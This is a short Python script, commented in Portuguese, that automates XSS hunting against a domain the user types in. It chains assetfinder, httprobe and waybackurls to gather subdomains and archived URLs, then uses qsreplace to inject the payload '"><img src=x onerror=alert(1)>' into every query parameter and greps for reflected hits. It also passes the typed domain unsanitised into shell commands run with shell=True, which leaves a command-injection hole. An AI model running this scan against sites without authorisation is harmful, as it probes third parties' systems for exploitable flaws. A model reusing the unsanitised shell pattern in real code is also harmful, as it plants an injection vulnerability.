import subprocess

# Função para executar comandos e capturar a saída
def run_command(command, title, verbose=False):
    print(f"Executando: {title}")
    if verbose:
        print(f"Comando: {command}")
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    if verbose:
        print(f"Saída: {output.decode()}")
    if error:
        print(f"Erro ao executar {title}: {error.decode()}")
    else:
        print(f"{title} concluído com sucesso.")

# Domínio alvo inserido
domain = input("Digite o domínio alvo (exemplo: dominio.com.br): ")

# Processos
titles = [
    "Executando assetfinder",
    "Executando httprobe",
    "Executando waybackurls",
    "Executando qsreplace para fuzzing XSS",
    "Executando freq para encontrar possíveis XSS",
    "Buscando por XSS FOUND"
]

# Comandos para cada processo
commands = [
    f"assetfinder -subs-only {domain} | anew subdomains.txt",
    "cat subdomains.txt | httprobe | tee -a host.txt",
    "cat host.txt | waybackurls | tee -a endpoint.txt",
    'cat endpoint.txt | qsreplace \'""><img src=x onerror=alert(1)>"\' | tee -a xss_fuzz.txt',
    "cat xss_fuzz.txt | freq | tee -a possible_xss.txt",
    "grep 'XSS FOUND' possible_xss.txt > resultado.txt"
]

# Imprimir banner
print(r"""
 _    _  _____  _____ _______ _____ _    _
| |  | |/ ____|/ ____|__   __/ ____| |  | |
| |__| | (___ | |       | | | |    | |__| |
|  __  |\___ \| |       | | | |    |  __  |
| |  | |____) | |____   | | | |____| |  | |
|_|  |_|_____/ \_____|  |_|  \_____|_|  |_|
                                           
""")

# Executar cada processo
for command, title in zip(commands, titles):
    run_command(command, title, verbose=True)

print("Busca concluída.")

